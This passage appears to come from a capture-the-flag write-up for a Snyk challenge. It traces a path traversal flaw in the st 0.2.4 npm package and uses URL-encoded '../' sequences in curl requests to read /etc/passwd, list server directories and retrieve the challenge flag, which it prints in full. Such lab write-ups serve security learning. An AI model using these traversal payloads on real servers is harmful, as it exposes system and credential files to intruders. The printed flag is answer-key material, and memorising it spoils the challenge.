</span></span><span class="line"><span class="cl">  <span class="nx">response</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">cwd</span><span class="p">()</span> <span class="o">+</span><span class="s1">&#39;/index.html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Static
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">st</span><span class="p">({</span> <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;./public&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/public&#39;</span> <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">app</span><span class="p">).</span><span class="nx">listen</span><span class="p">(</span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">),</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Express server listening on port &#39;</span> <span class="o">+</span> <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can also take a look at the <code>package.json</code> file to get the version numbers of the packages:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="o">:</span> <span class="s2">&#34;goof&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;version&#34;</span><span class="o">:</span> <span class="s2">&#34;1.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;description&#34;</span><span class="o">:</span> <span class="s2">&#34;A vulnerable todo demo application&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;homepage&#34;</span><span class="o">:</span> <span class="s2">&#34;https://snyk.io/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;repository&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span><span class="o">:</span> <span class="s2">&#34;git&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;url&#34;</span><span class="o">:</span> <span class="s2">&#34;https://github.com/Snyk/snyk-todo-list-demo-app/&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;scripts&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;start&#34;</span><span class="o">:</span> <span class="s2">&#34;node app.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;build&#34;</span><span class="o">:</span> <span class="s2">&#34;browserify -r jquery &gt; public/js/bundle.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cleanup&#34;</span><span class="o">:</span> <span class="s2">&#34;mongo express-todo --eval &#39;db.todos.remove({});&#39;&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;engines&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;node&#34;</span><span class="o">:</span> <span class="s2">&#34;6.14.1&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;dependencies&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;express&#34;</span><span class="o">:</span> <span class="s2">&#34;4.16.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;st&#34;</span><span class="o">:</span> <span class="s2">&#34;0.2.4&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I think it is weird that the program is using the <strong>st</strong> library.</p>
<p>The version used for <strong>st</strong> is <strong>0.2.4.</strong></p>
<p>After searching the internet , there seems to be a LFI vulnerability for this version of st.</p>
<p>Here is the link to snyk for the vulnerability:</p>
<p><a href="https://security.snyk.io/vuln/npm:st:20140206" target="_blank" rel="noopener noreffer">https://security.snyk.io/vuln/npm:st:20140206</a></p>
<p>Versions prior to 0.2.5 did not properly prevent path traversal. Literal dots in a path were resolved out, but url encoded dots were not. Thus, a request like¬†<code>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code>¬†would leak sensitive files and data from the server.</p>
<p>As of version 0.2.5, any¬†<code>'/../'</code>¬†in the request path, urlencoded or not, will be replaced with¬†<code>'/'</code>. If your application depends on url traversal, then you are encouraged to please refactor so that you do not depend on having¬†<code>..</code>¬†in url paths, as this tends to expose data that you may be surprised to be exposing.</p>
<p>So it seems like we can get LFI working here by just encoding the <code>../</code> characters using URL-encoding. A single dot in URL encoding is: <code>%2e</code> . So two dots would be <code>%2e%2e</code> and the forward slash character is represented as <code>%2f</code> in URL-encoded form.</p>
<p>By replacing problematic characters like mentioned in the snyk vulnerability we could craft a payload that looks like this:</p>
<p><code>%2e%2e%2f%2e%2e%2f%2e%2e%2F%2e%2e%2F%2e%2e/etc/passwd</code></p>
<p>Here is a proof-of-concept for this LFI:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2F%2e%2e%2F%2e%2e/etc/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/bin/false
</span></span><span class="line"><span class="cl">node:x:1000:1000::/home/node:/bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can get the contents of /etc/passwd which means that the LFI works!</p>
<p>It can even be abused to get directory listing:</p>
<p>File Listing PoC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/    
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;bin/&#34;</span>&gt;bin/&lt;/a&gt;         2019-05-08T01:41:31.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;boot/&#34;</span>&gt;boot/&lt;/a&gt;        2019-03-28T09:12:44.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;dev/&#34;</span>&gt;dev/&lt;/a&gt;         2022-11-09T11:51:50.758Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;etc/&#34;</span>&gt;etc/&lt;/a&gt;         2022-11-09T11:51:47.531Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;home/&#34;</span>&gt;home/&lt;/a&gt;        2019-05-08T02:14:27.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;lib/&#34;</span>&gt;lib/&lt;/a&gt;         2019-05-08T01:41:44.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;lib64/&#34;</span>&gt;lib64/&lt;/a&gt;       2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;media/&#34;</span>&gt;media/&lt;/a&gt;       2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;mnt/&#34;</span>&gt;mnt/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;opt/&#34;</span>&gt;opt/&lt;/a&gt;         2019-05-08T02:17:53.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;proc/&#34;</span>&gt;proc/&lt;/a&gt;        2022-11-09T11:51:50.747Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;root/&#34;</span>&gt;root/&lt;/a&gt;        2022-09-22T07:15:14.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;run/&#34;</span>&gt;run/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;sbin/&#34;</span>&gt;sbin/&lt;/a&gt;        2019-05-08T01:40:28.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;srv/&#34;</span>&gt;srv/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;sys/&#34;</span>&gt;sys/&lt;/a&gt;         2022-11-09T11:48:47.826Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;tmp/&#34;</span>&gt;tmp/&lt;/a&gt;         2022-09-22T07:15:14.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;usr/&#34;</span>&gt;usr/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;var/&#34;</span>&gt;var/&lt;/a&gt;         2019-05-06T00:00:00.000Z       -
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>After searching for a  while I found the source code of the program and found the flag.</p>
<p>It turns out that the source code for the program is located in <code>/usr/src/goof</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/  
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;goof/&#34;</span>&gt;goof/&lt;/a&gt;       2022-09-22T07:15:25.000Z       -
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let‚Äôs see what is inside that folder:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/goof/
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of &lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;../&#34;</span>&gt;../&lt;/a&gt;
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;node_modules/&#34;</span>&gt;node_modules/&lt;/a&gt;            2022-09-22T07:15:28.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;public/&#34;</span>&gt;public/&lt;/a&gt;                  2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;routes/&#34;</span>&gt;routes/&lt;/a&gt;                  2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;views/&#34;</span>&gt;views/&lt;/a&gt;                   2022-09-22T07:13:46.000Z           -
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;app.js&#34;</span>&gt;app.js&lt;/a&gt;                   2022-09-22T07:13:46.000Z         <span class="m">502</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;app.json&#34;</span>&gt;app.json&lt;/a&gt;                 2022-09-22T07:13:46.000Z         <span class="m">267</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;build-tag-push.sh&#34;</span>&gt;build-tag-push.sh&lt;/a&gt;        2022-09-22T07:13:46.000Z         <span class="m">206</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;challenge.yml&#34;</span>&gt;challenge.yml&lt;/a&gt;            2022-09-22T07:13:46.000Z        <span class="m">1261</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;docker-compose.yml&#34;</span>&gt;docker-compose.yml&lt;/a&gt;       2022-09-22T07:13:46.000Z         <span class="m">155</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;Dockerfile&#34;</span>&gt;Dockerfile&lt;/a&gt;               2022-09-22T07:13:46.000Z         <span class="m">203</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span>&gt;flag&lt;/a&gt;                     2022-09-22T07:13:46.000Z          <span class="m">72</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;index.html&#34;</span>&gt;index.html&lt;/a&gt;               2022-09-22T07:13:46.000Z         <span class="m">182</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;package-lock.json&#34;</span>&gt;package-lock.json&lt;/a&gt;        2022-09-22T07:13:46.000Z       <span class="m">34853</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;package.json&#34;</span>&gt;package.json&lt;/a&gt;             2022-09-22T07:13:46.000Z         <span class="m">518</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;README.md&#34;</span>&gt;README.md&lt;/a&gt;                2022-09-22T07:13:46.000Z          <span class="m">28</span>
</span></span><span class="line"><span class="cl">&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;test.py&#34;</span>&gt;test.py&lt;/a&gt;                  2022-09-22T07:13:46.000Z         <span class="m">603</span>
</span></span><span class="line"><span class="cl">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is the flag!</p>
<p>It‚Äôs located in <code>/usr/src/goof/flag</code></p>
<p>Let‚Äôs retrieve the flag using curl</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/usr/src/goof/flag
</span></span><span class="line"><span class="cl">SNYK<span class="o">{</span>6854ecb17f23afdf2610f741dd07bd6099c616e4ac2a403eb14fa8689e1fb0af<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>found the flag:</p>
<p><code>SNYK{6854ecb17f23afdf2610f741dd07bd6099c616e4ac2a403eb14fa8689e1fb0af}</code></p>
]]></description></item></channel></rss>